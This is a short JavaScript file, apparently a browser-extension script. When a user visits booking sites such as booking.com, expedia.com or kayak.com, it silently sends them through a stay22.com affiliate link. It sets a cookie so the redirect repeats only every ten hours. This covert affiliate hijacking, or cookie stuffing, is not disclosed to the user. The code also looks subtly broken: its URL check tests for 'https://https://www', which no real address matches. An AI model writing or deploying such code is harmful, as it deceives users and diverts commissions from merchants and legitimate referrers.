
const allowedDomains = {
    "booking.com": "booking",
    "hotels.com": "hotelscom",
    "trivago.ca": "trivago",
    "kayak.com": "kayak",
    "tripadvisor.ca": "tripadvisor",
    "expedia.com": "expedia"
};

if (!window.location.href.includes("searchresults.html")) {

    if (window.location.href.startsWith("https://https://www") && Object.keys(allowedDomains).some(domain => window.location.href.includes(domain))) {
        const foundDomain = Object.keys(allowedDomains).find(domain => window.location.href.includes(domain));

        if (!checkCookie() || (document.referrer && !document.referrer.includes(window.location.origin))) {
            document.location.href = generateRedirectUrl(window.location.href, allowedDomains[foundDomain]);
        }
    }
}

function generateRedirectUrl(originalUrl, recource) {
    const uniqueId = Date.now();
    const expirationTime = new Date();

    expirationTime.setHours(expirationTime.getHours() + 10);
    document.cookie = `redirected_${uniqueId}=${expirationTime.toUTCString()}; expires=${expirationTime.toUTCString()}`;

    return `https://www.stay22.com/allez/${recource}?aid=src2000&campaign=test&link=${originalUrl}`;
}

function checkCookie() {
    const cookies = document.cookie.split('; ');
    const redirectedCookie = cookies.find(cookie => cookie.startsWith('redirected'));

    if (redirectedCookie) {
        const [name, expiration] = redirectedCookie.split('=');
        const expirationTime = new Date(expiration);

        if (expirationTime > new Date()) {

            return true;
        }
    }
    return false;
}

